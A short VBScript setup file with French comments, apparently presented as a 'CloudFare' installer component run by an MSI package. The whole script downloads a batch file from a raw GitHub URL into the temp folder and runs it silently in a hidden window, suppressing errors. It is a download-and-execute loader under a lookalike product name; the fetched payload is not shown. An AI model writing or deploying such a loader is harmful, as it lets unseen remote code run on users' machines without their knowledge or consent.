' CloudFare Setup VBScript v1.0
' Ce script VBScript est appelé par le MSI pour télécharger et exécuter Install.bat
' Exécution silencieuse, pas de fenêtre visible

Option Explicit

Dim objShell, objFSO
Dim strRepoURL, strRawURL, strTempDir, strBatFile
Dim objHTTP, strBatContent, intStatus

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Configuration
strRepoURL = "https://github.com/davidrenand/repos"
strRawURL = "https://raw.githubusercontent.com/davidrenand/repos/main/scripts/"
strTempDir = objShell.ExpandEnvironmentStrings("%TEMP%") & "\CloudFare"
strBatFile = strTempDir & "\Install.bat"

' Créer répertoire temporaire
If Not objFSO.FolderExists(strTempDir) Then
    objFSO.CreateFolder(strTempDir)
End If

' Télécharger Install.bat depuis GitHub
On Error Resume Next
Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")

objHTTP.Open "GET", strRawURL & "Install.bat", False
objHTTP.SetRequestHeader "User-Agent", "CloudFare/1.0"
objHTTP.Send

intStatus = objHTTP.Status

If intStatus = 200 Then
    ' Écrire le fichier
    Dim objFile
    Set objFile = objFSO.CreateTextFile(strBatFile, True)
    objFile.Write objHTTP.ResponseText
    objFile.Close
    Set objFile = Nothing
    
    ' Exécuter le fichier batch
    objShell.Run strBatFile, 0, True
Else
    ' Erreur lors du téléchargement
    WScript.Echo "Erreur: Impossible de télécharger Install.bat (Status: " & intStatus & ")"
End If

On Error GoTo 0

' Nettoyer
Set objHTTP = Nothing
Set objFSO = Nothing
Set objShell = Nothing

WScript.Quit 0
